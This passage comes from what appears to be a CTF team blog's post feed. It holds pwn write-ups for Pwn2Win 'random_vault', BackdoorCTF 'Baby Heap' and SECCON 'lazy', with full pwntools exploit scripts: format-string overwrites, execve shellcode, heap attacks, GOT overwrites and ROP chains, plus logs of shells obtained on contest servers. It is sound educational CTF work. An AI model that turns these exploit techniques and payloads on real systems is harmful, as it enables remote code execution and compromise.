which prevents us from at every username change to revert the global back to its original value, well theoretically is possible but we only have 81 characters to do it, because of this it’s not possible to do it with 4 %hn‘s, instead we could do it with two %n‘s but it’s way too many characters to print, this would take hours so this option was discarded by me in the beginning. Also something interesting happens on the usual function where the setvbuff functions are lying in:mprotect is changing the protections settings from a region of memory at qword_5000 0x1000 bytes are now RWX this means in this region we can read, write and execute code. Leaking pieWe have a format string vulnerability right at the start of the program so let’s leak some addresses with: 1r.sendlineafter('Username: ','%7$lx|%11$lx') An address aligned with the PIE base is located at the 11 position the stack, also an address aligned with the stack addresses is located at the 7th but I didn’t require this one for my current solution. One thing we could take from the store function:Store function will store pointers from the stdin on random locations, which are generated based on a seed, we can control this seed by using format string, knowing those locations on that special memory region RWX we can modify qword_5000 pointer to one of them and execute our shellcode. Here is a function I wrote in python to calculate the offsets with the seed 0: 12345678def indices_with_seed_zero(): from ctypes import cdll libc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\") libc.srand(0) for x in xrange(7): v0 = libc.rand() q = ((v0 &gt;&gt; 0x38) + v0) &amp; 0xff - ((v0 &gt;&gt; 0x1F) &gt;&gt; 0x18) print q*8 The output: 12345678$ python random_vault.py 82415848409206482040592 So the locations that we are going to write are: 1234567Index 0: PIE_BASE+824+0x5010Index 1: PIE_BASE+1584+0x5010Index 2: PIE_BASE+840+0x5010Index 3: PIE_BASE+920+0x5010Index 4: PIE_BASE+648+0x5010Index 5: PIE_BASE+2040+0x5010Index 6: PIE_BASE+592+0x5010 The format string code used to overwrite SEED and qword_5000:123456789101112SEED = PIE+0x5008QWORD5000 = PIE+0x5000unk_5010 = PIE+0x5010LOW_QWORD4020 = unk_5010 &amp; 0xf000 | 0x348payload = '%29$ln' # Clear SEEDpayload += '%&#123;&#125;x%30$hn'.format(LOW_QWORD4020)s = payloads += ' '*(40-len(payload))s += p64(SEED)s += p64(QWORD5000) Index 0 and Index 2 are very near to each other! 0x10 byte apart, I used this to my advantage and manage to call a read syscall successfully. First on index 0 I cleared RDI register and jumped to Index 2: 123xor edi, edi ; clears rdi (we want to read from STDIN so we need this to be 0)add rdx, 0x10 ; ads 0x10 to $rdx register which contains the address where we initially jumpedjmp rdx ; jumps to Index 2 shellcode Finally we exchange R11 with RDX(size of bytes we want to read) and R11 with RSI (buffer we want to write), luckily RAX is already 0 which is the number of read sycall on linux at x64 : 123xchg r11,rdx ; initial value of $r11 is 0x241 so we want this on rdx register xchg r11,rsi ; old value of $rdx is now at r11 this address is also the address right at the rip instructionsyscall ; read($rdi, $rsi, rdx) with $rax == 0 The code to this store this shellcode: 12345r.sendlineafter('4. Quit\\n\\n','2')r.sendlineafter(': ', str(0xe2ff10c28348ff31)) # xor edi, edi ; add rdx, 0x10 ; jmp rdx for i in range(6): r.sendlineafter(': ', str(0x050ff38749d38749)) # xchg r11,rdx ; xchg r11,rsi ; syscall Finally we can read from the STDIN the shellcode that will get us a shell: 12345678910mov rbx, 0xFF978CD091969DD1neg rbxpush rbxxor eax, eaxcdqxor esi, esipush rsppop rdimov al, 0x3b ; sys_execvesyscall Sending data from the stdin: 123rip = p64(0x050ff38749d38749) # needs to be the code at #rip otherwise we get a segfaultshellcode = '\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x31\\xc0\\x99\\x31\\xf6\\x54\\x5f\\xb0\\x3b\\x0f\\x05'r.sendline(rip+shellcode) The full exploit code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *#from libc import time,time_thost, port = \"200.136.252.34\", \"1245\"filename = \"./random_vault\"elf = ELF(filename)context.arch = 'amd64'def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: if x &lt; 0xffff: script += \"b *0x%x\\n\"%(PIE+x) else: script += \"b *0x%x\\n\"%(x) gdb.attach(r,gdbscript=script)def indices_with_seed_zero(): from ctypes import cdll libc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\") libc.srand(0) for x in xrange(7): v0 = libc.rand() q = ((v0 &gt;&gt; 0x38) + v0) &amp; 0xff - ((v0 &gt;&gt; 0x1F) &gt;&gt; 0x18) print q*8 context.terminal = ['tmux', 'new-window']r = getConn()r.sendlineafter('Username: ','%7$lx|%11$lx')r.recvuntil('Hello, ')STACK = int(r.recvuntil('|')[:-1],16)PIE = int(r.recvline().rstrip(),16) - 0x1750SEED = PIE+0x5008QWORD5000 = PIE+0x5000unk_5010 = PIE+0x5010log.info(\"LEAKED STACK 0x%x\" % STACK)log.info(\"LEAKED PIE 0x%x\" % PIE)log.info(\"LEAKED SEED 0x%x\" % SEED)log.info(\"LEAKED QWORD5000 0x%x\" % QWORD5000)log.info(\"LEAKED unk_5010 0x%x\" % unk_5010)r.sendlineafter('4. Quit\\n\\n','1')#context.log_level = \"debug\"shellcode = '\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x31\\xc0\\x99\\x31\\xf6\\x54\\x5f\\xb0\\x3b\\x0f\\x05'LOW_QWORD4020 = unk_5010 &amp; 0xf000 | 0x348payload = '%29$ln' # Clear SEEDpayload += '%&#123;&#125;x%30$hn'.format(LOW_QWORD4020)s = payloads += ' '*(40-len(payload))s += p64(SEED)s += p64(QWORD5000)r.sendlineafter('Username: ', s)#r.recvuntil('\\x20\\x20\\x32')if not args.REMOTE and args.GDB: debug([0x16B5,0x1474,0x161F]) # 0x16B5,0x1474,15ACr.sendlineafter('4. Quit\\n\\n','2')r.sendlineafter(': ', str(0xe2ff10c28348ff31)) # xor edi, edi ; add rdx, 0x10 ; jmp rdx for i in range(6): r.sendlineafter(': ', str(0x050ff38749d38749)) # xchg r11,rdx ; xchg r11,rsi ; syscallr.sendline(p64(0x050ff38749d38749)+shellcode)r.interactive()r.close() Running it: 123456789101112$ python random_vault.py REMOTE[+] Opening connection to 200.136.252.34 on port 1245: Done[*] LEAKED STACK 0x7ffeb091b470[*] LEAKED PIE 0x55661a762000[*] LEAKED SEED 0x55661a767008[*] LEAKED QWORD5000 0x55661a767000[*] LEAKED unk_5010 0x55661a767010[*] Switching to interactive modeYou've stored the following secrets:#1: 16356810799245229873, #2: 364777857225033545, #3: 364777857225033545, #4: 364777857225033545, #5: 364777857225033545, #6: 364777857225033545, #7: 364777857225033545$ cat home/chall/flagCTF-BR&#123;_r4nd0m_1nd1c3s_m4ke_th3_ch4ll3nge_m0r3_fun_&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Format String","slug":"Pwn/x64/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"}],"tags":[{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"pwn2win2019","slug":"pwn2win2019","permalink":"https://teamrocketist.github.io/tags/pwn2win2019/"}]},{"title":"[Pwn] BackdoorCtf 2019 - Baby Heap","slug":"Pwn-BackdoorCtf-2019-Baby-Heap","date":"2019-10-27T19:10:02.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/10/27/Pwn-BackdoorCtf-2019-Baby-Heap/","link":"","permalink":"https://teamrocketist.github.io/2019/10/27/Pwn-BackdoorCtf-2019-Baby-Heap/","excerpt":"","text":"Baby Heap pwn backdoorctf19 Just another babyheap challenge. http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6 nc 51.158.118.84 17001 Flag format: CTF{…} Created by: Nipun Gupta Another heap challenge the binary had the following attributes: 12$ file babyheapbabyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=203fc5be05469491a57e7873624c72ef731ed850, stripped Checking the security: 1234567$ checksec babyheap[*] '/ctf/work/pwn/babyheap/babyheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Partial RELRO which means we can actually write at global offset table this simplifies things a bit and also PIE is not enabled so we can access this addresses very easily without a leak. The libc version is:12$ strings libc.so.6 | grep 'libc-'libc-2.23.so Exploit planSo for those who want a very fast solution this my exploit plan: Use unsorted bin attack to overwrite the value global_max_fast by doing a 4 bit brute force. Create a fake chunk(0x31) where the saved sizes of malloc are saved (global variables). Use fastbin dup to malloc at the created fake chunk and overwrite a string pointer to atoi got. By using edit we can get an arbitrary write at atoi got, we want to change it to printf so we can leak libc. The program is not broken because printf returns the number of the printed bytes string so we still using the options to edit atoi got to system. Send ‘/bin/sh\\x00’ to read and get a shell. Binary analysisThe first thing we can see right at the beginning is mallopt(1,0);From linux man pages: 12The mallopt() function adjusts parameters that control the behaviour of the memory-allocation functions (see malloc(3)). The param argument specifies the parameter to be modified, and value specifies the new value for that parameter. The parameter being modified is 1 from the symbols also from linux man pages:1234567/*Symbol param # default allowed param values M_MXFAST 1 64 0-80 (0 disables fastbins) M_TRIM_THRESHOLD -1 128*1024 any (-1U disables trimming) M_TOP_PAD -2 0 any M_MMAP_THRESHOLD -3 128*1024 any (or 0 if no MMAP support) M_MMAP_MAX -4 65536 any (0 disables use of mmap)*/ We know that 1 is M_MXFAST when 0 means fastbins become disabled… Continuing our analysis we need to look for vulnerabilities, delete function has a double free vulnerability, there is a check at the beginning, but it’s only checking if this index was previously allocated, also another thing to note is that we are limited to 8 free’s, freeLimit_602088 is initialized to 8. Another vulnerability can be found at edit, as in delete function there’s no check, so we have a UAF vulnerability here:There’s another limitation to program there’s only 11 slots where the data is saved so we can only use 11 mallocs on our exploit. ExploitModifying global_max_fastThere isn’t a print function so there’s no simple way to leak libc and also we can’t use fastbins because they were disabled, our first approach is to find a way re-enable fastbins. This can be done if we find a way to modify global_max_fast into a big value, but how do we achieve this, we don’t even have libc to calculate the offset to global_max_fast ? Well one thing we can is a 4 bit bruteforce, if we free a chunk into an unsortedbin:That’s how we can find the address of global_max_fast, and why this variable in particular ? Because it controls the max size that malloc interprets a chunk as fastbin, and it’s current value is 10 because of mallopt. We need to find a way to modify this value into a bigger number, we can do this by using an unsorted bin attack, we need to modify the bk to the address we want to modify minus 0x10. This is how the exploit looks right now 123456789101112131415161718192021222324252627def exploit(): global r r = getConn() if not args.REMOTE and args.GDB: debug([0x400a5b,0x400bcc]) # 0x400970 # Unsorted bin attack add(0,0x20,'A'*0x10) add(1,0x80,'B'*0x80) # Chunk to free add(2,0x20,'c'*0x10) # add(8,0x31,'d'*0x10) # CREATE A FAKE CHUNK HERE free(1) edit(1, p64(0x0)+p16(0x67f8-0x10)) # 4 bit brute force try: add(3,0x80,'C') # if we don't get an error here and global_max_fast will be modified. except: log.failure(\"not lucky enough!\") r.close() return False r.interactive() return Truewhile not exploit(): pass If we are successful we will modify global_max_fast: Arbitrary write using fastbin dupWe can use fastbin dup now but still we don’t have any leaks, luckily we know that size of each data is being saved at 0x6020e0:The data pointers to the strings are also saved in a global variable at ptr(0x602120): This how it looks in memory in gdb:I created a fake chunk at index 8 with malloc: 1add(8,0x31,'c'*0x10) # CREATE A FAKE CHUNK HERE Now we proceed to use fastbin dup to modify the fastbin linked list: 123456789# fastbin dupfree(0) free(2)free(0)edit(0,p64(0x6020f8)) # fake chunkadd(4,0x20,'C')add(5,0x20,p64(0)+p64(0)+p64(0)+p64(elf.got['atoi']))edit(0, p64(elf.plt['printf'])) We edited the index 0 string pointer into atoi got, later with this we can modify atoi got into printf gaining a format string vulnerability to leak libc: 123456s = '%7$s 's += p64(elf.got['puts'])r.sendlineafter(\"\\n4) Exit\\n&gt;&gt; \",s)PUTS = u64(r.recv(0x6).ljust(0x8,'\\x00'))LIBC = PUTS-libc.symbols['puts']SYSTEM = LIBC+libc.symbols['system'] Finaly after getting system we change again atoi to system and send the /bin/sh string: 1234r.sendlineafter(\"\\n4) Exit\\n&gt;&gt; \",\"AA\")r.sendlineafter(\"Enter the index:\\n\", '')r.sendafter(\"Please update the data:\\n\", p64(SYSTEM))r.send('/bin/sh\\x00') The shell is achieved after this: 12345678910111213141516171819202122232425262728293031323334353637383940414243$ python babyheap.py REMOTE[*] '/ctf/work/pwn/babyheap/babyheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '/ctf/work/pwn/babyheap/libc-2.23.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to 51.158.118.84 on port 17001: Done[-] not lucky enough![*] Closed connection to 51.158.118.84 port 17001[+] Opening connection to 51.158.118.84 on port 17001: Done[-] not lucky enough!.... Truncated......[+] Opening connection to 51.158.118.84 on port 17001: Done[-] not lucky enough![*] Closed connection to 51.158.118.84 port 17001[+] Opening connection to 51.158.118.84 on port 17001: Done[*] LIBC 0x7ffaa87a0000[*] SYSTEM 0x7ffaa87e5390[*] Switching to interactive modeupdate successful1) Add data2) Edit data3) Remove data4) Exit&gt;&gt; $ lsDockerfilebabyheapbabyheap.cbeast.tomlflag.txtpost-build.shpublicsetup.sh$ cat flag.txt....hiddenFlag.... The full exploit: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596from pwn import *host, port = \"51.158.118.84\", \"17001\"filename = \"./babyheap\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.23.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(x) gdb.attach(r,gdbscript=script)def add(index, size, data): r.sendlineafter(\"\\n4) Exit\\n&gt;&gt; \",'1') r.sendlineafter(\"Enter the index:\\n\", str(index)) r.sendlineafter(\"Enter the size:\\n\", str(size)) r.sendafter(\"Enter data:\\n\", data)def edit(index, data): r.sendlineafter(\"\\n4) Exit\\n&gt;&gt; \",'2') r.sendlineafter(\"Enter the index:\\n\", str(index)) r.sendafter(\"Please update the data:\\n\", data)def free(index): r.sendlineafter(\"\\n4) Exit\\n&gt;&gt; \",'3') r.sendlineafter(\"Enter the index:\\n\", str(index))context.terminal = ['tmux', 'new-window']def exploit(): global r r = getConn() # Unsorted bin attack add(0,0x20,'A'*0x10) add(1,0x80,'B'*0x80) # Chunk to free add(2,0x20,'c'*0x10) # add(8,0x31,'c'*0x10) # CREATE A FAKE CHUNK HERE free(1) edit(1, p64(0x0)+p16(0x67f8-0x10)) # 4 bit brute force try: add(3,0x80,'C') # if we don't get an error here and global_max_fast will be modified to a very big number # fastbin dup free(0) free(2) free(0) if not args.REMOTE and args.GDB: debug([0x400a5b,0x400bcc]) # 0x400970 edit(0,p64(0x6020f8)) # fake chunk add(4,0x20,'C') add(5,0x20,p64(0)+p64(0)+p64(0)+p64(elf.got['atoi'])) edit(0, p64(elf.plt['printf'])) s = '%7$s ' s += p64(elf.got['puts']) r.sendlineafter(\"\\n4) Exit\\n&gt;&gt; \", s) PUTS = u64(r.recv(0x6).ljust(0x8,'\\x00')) LIBC = PUTS-libc.symbols['puts'] SYSTEM = LIBC+libc.symbols['system'] log.info(\"LIBC 0x%x\"%LIBC) log.info(\"SYSTEM 0x%x\"%SYSTEM) r.sendlineafter(\"\\n4) Exit\\n&gt;&gt; \",\"AA\") r.sendlineafter(\"Enter the index:\\n\", '') r.sendafter(\"Please update the data:\\n\", p64(SYSTEM)) # changes atoi for system r.send('/bin/sh\\x00') # system(\"/bin/sh\\x00\") except: log.failure(\"not lucky enough!\") r.close() return False r.interactive() r.close() return True#exploit()while not exploit(): pass","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Unsorted Bin Attack","slug":"Pwn/x64/Glibc-Malloc/Unsorted-Bin-Attack","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Unsorted-Bin-Attack/"},{"name":"Fast Bin Dup","slug":"Pwn/x64/Glibc-Malloc/Fast-Bin-Dup","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Fast-Bin-Dup/"}],"tags":[{"name":"double_free","slug":"double-free","permalink":"https://teamrocketist.github.io/tags/double-free/"},{"name":"backdoorctf2019","slug":"backdoorctf2019","permalink":"https://teamrocketist.github.io/tags/backdoorctf2019/"},{"name":"use_after_free","slug":"use-after-free","permalink":"https://teamrocketist.github.io/tags/use-after-free/"},{"name":"fastbindup","slug":"fastbindup","permalink":"https://teamrocketist.github.io/tags/fastbindup/"}]},{"title":"[Pwn] SECCON 2019 - lazy","slug":"Pwn-SECCON-2019-lazy","date":"2019-10-21T18:43:44.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/10/21/Pwn-SECCON-2019-lazy/","link":"","permalink":"https://teamrocketist.github.io/2019/10/21/Pwn-SECCON-2019-lazy/","excerpt":"","text":"lazy 332 lazy.chal.seccon.jp 33333 1st StageNo files have been provided in this challenge, let’s see what we can do it by connecting to the server: 1234$ nc lazy.chal.seccon.jp 333331: Public contents2: Login3: Exit We are presented with 3 options, login is to provide a username and password which for now we don’t know yet, public contents provides us with a bunch of files and the source code of login_source.c file: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#define BUFFER_LENGTH 32#define PASSWORD \"XXXXXXXXXX\"#define USERNAME \"XXXXXXXX\"int login(void)&#123; char username[BUFFER_LENGTH]; char password[BUFFER_LENGTH]; char input_username[BUFFER_LENGTH]; char input_password[BUFFER_LENGTH]; memset(username,0x0,BUFFER_LENGTH); memset(password,0x0,BUFFER_LENGTH); memset(input_username,0x0,BUFFER_LENGTH); memset(input_password,0x0,BUFFER_LENGTH); strcpy(username,USERNAME); strcpy(password,PASSWORD); printf(\"username : \"); input(input_username); printf(\"Welcome, %s\\n\",input_username); printf(\"password : \"); input(input_password); if(strncmp(username,input_username,strlen(USERNAME)) != 0)&#123; puts(\"Invalid username\"); return 0; &#125; if(strncmp(password,input_password,strlen(PASSWORD)) != 0)&#123; puts(\"Invalid password\"); return 0; &#125; return 1;&#125;void input(char *buf)&#123; int recv; int i = 0; while(1)&#123; recv = (int)read(STDIN_FILENO,&amp;buf[i],1); if(recv == -1)&#123; puts(\"ERROR!\"); exit(-1); &#125; if(buf[i] == '\\n')&#123; return; &#125; i++; &#125;&#125; There’s an obvious buffer overflow vulnerability at input function, USERNAME and PASSWORD are defined with the #define macros and later copied into local variables in the stack: 12strcpy(username,USERNAME);strcpy(password,PASSWORD); Since we have no limits on the number of characters and input_username is located before in the stack we can leak both username and password if we fill until we reach that variable. In this case we can leak the password by sending 32 characters(size of buffer), remember that to interrupt the input we need to send a newline in the end so we send 31* &#39;A&#39; + &#39;\\n&#39;. Leaking the password: 12345678$ nc lazy.chal.seccon.jp 333331: Public contents2: Login3: Exit2username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWelcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3XPL01717 To leak the username we need to &#39;A&#39;*(32+31)+&#39;\\n&#39;: 12345678910$ python -c \"print 'A'*(31+32)\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ nc lazy.chal.seccon.jp 333331: Public contents2: Login3: Exit2username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWelcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_H4CK3R_ The username is H4CK3R and the password is 3XPL01717. 2nd StageAfter logging in we are presented with another option: 1234567891011121314151617181920nc lazy.chal.seccon.jp 333331: Public contents2: Login3: Exit2username : _H4CK3R_Welcome, _H4CK3R_password : 3XPL01717Logged in!1: Public contents2: Login3: Exit4: Manage4Welcome to private directoryYou can download contents in this directory, but you can't download contents with a dot in the namelazylibc.so.6Input file name We can now download the full executable but unfortunately we can’t download the libc.so.6 which is probably a modified version, at this stage I downloaded lazy and started reverse engineering the binary: 123456def downloadLazy(): r.sendlineafter('4: Manage\\n','4') r.sendlineafter('Input file name\\n', 'lazy') r.recvuntil('Sending 14216 bytes') with open('lazy', 'w+') as f: f.write(r.recvall(timeout=2)) Opening it on IDA we find a format string vulnerability after inputting the file name:This can be combined with the buffer overflow vulnerability, we can leak addresses from the stack in this case we can leak the stack canary and a libc address from the GOT but we are missing the final piece of the puzzle we don’t know which libc version is to calculate the offsets. Failed approaches to get the libc.so.6 file: My first approach was to leak some libc addresses from the GOT and tried to use libc-database but I failed the libc is probably a custom one modified by the author on purpose, so my only option was to find a way to download the libc.so.6 from the server. 2nd approach was to modify the file name with format string perhaps there is a check in download function which limits the amount of characters of the filename making this very hard or almost impossible (at least I didn’t manage to do it this way). The one that worked was to create a ropchain that would open the file and jump right at the middle of the download function at the call fstat function and why at the middle ?The first three file descriptors are reserved for stdin (0x0), stdout(0x1) and stderr(0x2), so the next open we are going to use in ROP is going to be 0x3 this is important to know because we don’t have a gadget that can control move values from the register rax (open returns the fd to rax) but since we know exactly the fd number is we can just use a POP RDI gadget to move the number 0x3 there. There are two useful ROP gadgets that can be used to execute open: 1234$ ROPgadget --binary lazy | grep 'pop rdi'0x00000000004015f3 : pop rdi ; ret$ ROPgadget --binary lazy | grep 'pop rsi'0x00000000004015f1 : pop rsi ; pop r15 ; ret With this we can control both 1st and 2nd args of a function so we can construct the execution of open like this: 123456ropchain = p64(POPRSIR15)ropchain += p64(0x0)ropchain += p64(LIBC_SO_6)ropchain += p64(POPRDI)ropchain += p64(LIBC_SO_6)ropchain += p64(elf.plt['open']) # open(\"libc.so.6\", 0) Note that LIBC_SO_6 address can be taken from the binary by using IDA like this:Another thing that we need to consider we need to set RBP into a valid address, RBP is the base frame pointer which is used to calculate with offsets to the local variables of that function , the RBP** is fucked because we are jumping right at the middle of the function: 12ropchain += p64(POPRBP)ropchain += p64(STACKADDR+0x90+0x30) # RBP = STACKADDR+0xc0 STACKADDR is the address we leak from the stack with format string at the position 1, but why +0xc0 ?Another problem emerges, we also need to modify the local variable at RBP-0xdc to 0x3 otherwise read will read from a file descriptor at a value in that location in this case it will be 0x0 which is the stdinBut how can we modify a value at that location of the stack ? we can form a read ropchain but how do we do it if we don’t have any gadget to modify rdx ? well we can use atoi in the end of the executing it will set rdx to 0xa which is enough to use read to set the value 0x3 from the stdin. Forming the ropchain: 12345678910ropchain += p64(POPRDI)ropchain += p64(0x401788)ropchain += p64(elf.plt['atoi']) # atoi(0x401788) which will do RDX = 0xaropchain += p64(POPRSIR15)ropchain += p64(STACKADDR+0xc0-0xdc)ropchain += p64(0x3)ropchain += p64(POPRDI)ropchain += p64(0x0)ropchain += p64(elf.plt['read']) # read(0, STACKADDR+0xc0-0xdc, 0xa) Our python code to send this from the stdin: 1r.sendline(p64(0x03)+'\\x00') Remember this is necessary because since we are skipping running open at the download function we don’t also set RBP-0xdc to 0x3 which it should have been done here:And finally the last part which is to setup the parameters for fstat and jump to the middle of download: 123456ropchain += p64(POPRSIR15)ropchain += p64(STACKADDR)ropchain += p64(0x3) ropchain += p64(POPRDI)ropchain += p64(0x3)ropchain += p64(0x400f4c) # fstat(fd=0x3, STACKADDR) After this we can successfully download but the file is somehow corrupted it came incomplete perhaps we can still get the offsets for the functions we need to create a final ropchain and get a shell: The offset to system:The offset to /bin/sh:The offset to puts:The functions that I used to leak addresses: 1234567891011# Leaks from the stackdef leakFMTSi(i): r.sendlineafter('4: Manage\\n','4') r.sendlineafter('Input file name\\n', '%&#123;&#125;$lx '.format(i))# Leaks from an addressdef leakFMTSaddr(addr): r.sendlineafter('4: Manage\\n','4') s = '%7$s ' s += p64(addr) r.sendlineafter('Input file name\\n', s) Leaking the addresses, calculating offsets to libc: 12345678910111213141516171819202122leakFMTSaddr(elf.got['puts']) # canaryr.recv(0xb)PUTS = u64(r.recv(0x6).ljust(0x8,'\\x00'))LIBC = PUTS-0x67880SYSTEM = LIBC+0x3f570BINSH = LIBC+0x163c38log.info(\"PUTS 0x%x\"%PUTS)log.info(\"LIBC 0x%x\"%LIBC)log.info(\"SYSTEM 0x%x\"%SYSTEM)log.info(\"BINSH 0x%x\"%BINSH)print r.recvuntil('OK! Downloading...\\n') leakFMTSi(9)r.recvuntil('Filename : ')CANARY = int(r.recv(0x10),16)log.info(\"CANARY 0x%x\"%CANARY)leakFMTSi(1)r.recvuntil('Filename : ')STACKADDR = int(r.recv(0x10),16)STACKADDR += 0x900 # prevent a stupid printf errorlog.info(\"STACKADDR 0x%x\"%STACKADDR) The final ropchain to get a shell: 12345678def exploit(): padding = 'libc'+'\\x00'*0x14 POPRDI = 0x00000000004015f3 ropchain = p64(POPRDI) ropchain += p64(BINSH) ropchain += p64(SYSTEM) r.sendlineafter('4: Manage\\n','4') r.sendline(padding+p64(CANARY)+'A'*8+ropchain) The full exploit: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152from pwn import *import stringimport oshost, port = \"lazy.chal.seccon.jp\", \"33333\"filename = \"./lazy\"elf = ELF(filename)context.arch = 'amd64'def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp, pie=True, source=False, pscript=\"\"): script = \"\" PIE = get_PIE(r) for x in bp: if source: script += \"b %s\\n\"%(x) elif pie: script += \"b *%x\\n\"%(PIE+x) else: script += \"b *0x%x\\n\" % x script += pscript gdb.attach(r,gdbscript=script)def login(username, password): r.sendlineafter('3: Exit\\n','2') r.sendlineafter('username : ', username) r.sendlineafter('password : ', password)def downloadLazy(): r.sendlineafter('4: Manage\\n','4') r.sendlineafter('Input file name\\n', 'lazy') r.recvuntil('Sending 14216 bytes') with open('lazy', 'w+') as f: f.write(r.recvall(timeout=2))# Leaks from the stackdef leakFMTSi(i): r.sendlineafter('4: Manage\\n','4') r.sendlineafter('Input file name\\n', '%&#123;&#125;$lx '.format(i))# Leaks from an addressdef leakFMTSaddr(addr): r.sendlineafter('4: Manage\\n','4') s = '%7$s ' s += p64(addr) r.sendlineafter('Input file name\\n', s)def overflow(): file = 'libc' padding = file+'\\x00'*(0x18-len(file)) POPRDI = 0x00000000004015f3 POPRBP = 0x0000000000400c70 POPRSIR15 = 0x00000000004015f1 POPRSPR13R14R15 = 0x00000000004015ed LIBC_SO_6 = 0x400689 PLACETOPIVOT = 0x602050 ropchain = p64(POPRSIR15) ropchain += p64(0x0) ropchain += p64(LIBC_SO_6) ropchain += p64(POPRDI) ropchain += p64(LIBC_SO_6) ropchain += p64(elf.plt['open']) # open(\"libc.so.6\", 0) ropchain += p64(POPRBP) ropchain += p64(STACKADDR+0xc0) # RBP = STACKADDR+0x90+0x30 ropchain += p64(POPRDI) ropchain += p64(0x401788) ropchain += p64(elf.plt['atoi']) # atoi(0x401788) which will do RDX = 0xa ropchain += p64(POPRSIR15) ropchain += p64(STACKADDR+0xc0-0xdc) ropchain += p64(0x3) ropchain += p64(POPRDI) ropchain += p64(0x0) ropchain += p64(elf.plt['read']) # read(0, STACKADDR+0x90+0x30-0xdc, 0xa) ropchain += p64(POPRSIR15) ropchain += p64(STACKADDR) ropchain += p64(0x3) ropchain += p64(POPRDI) ropchain += p64(0x3) ropchain += p64(0x400f4c) # fstat(fd=0x3, STACKADDR) r.sendlineafter('4: Manage\\n','4') r.sendlineafter('Input file name\\n', padding+p64(CANARY)+'A'*8+ropchain)def exploit(): padding = 'libc'+'\\x00'*0x14 POPRDI = 0x00000000004015f3 ropchain = p64(POPRDI) ropchain += p64(BINSH) ropchain += p64(SYSTEM) r.sendlineafter('4: Manage\\n','4') r.sendline(padding+p64(CANARY)+'A'*8+ropchain)context.terminal = ['tmux', 'new-window']for _ in xrange(0,2): r = getConn() if not args.REMOTE and args.GDB: #debug([\"login_source.c:49\",\"login_source.c:32\"], pie=False, source=True) debug([0x40146c,0x00000000004015f3], pie=False) # chdir 0x4013da read 0x400d33 login(\"_H4CK3R_\", \"3XPL01717\") #downloadLazy() leakFMTSaddr(elf.got['puts']) # canary r.recv(0xb) PUTS = u64(r.recv(0x6).ljust(0x8,'\\x00')) LIBC = PUTS-0x67880 SYSTEM = LIBC+0x3f570 BINSH = LIBC+0x163c38 log.info(\"PUTS 0x%x\"%PUTS) log.info(\"LIBC 0x%x\"%LIBC) log.info(\"SYSTEM 0x%x\"%SYSTEM) log.info(\"BINSH 0x%x\"%BINSH) print r.recvuntil('OK! Downloading...\\n') leakFMTSi(9) r.recvuntil('Filename : ') CANARY = int(r.recv(0x10),16) log.info(\"CANARY 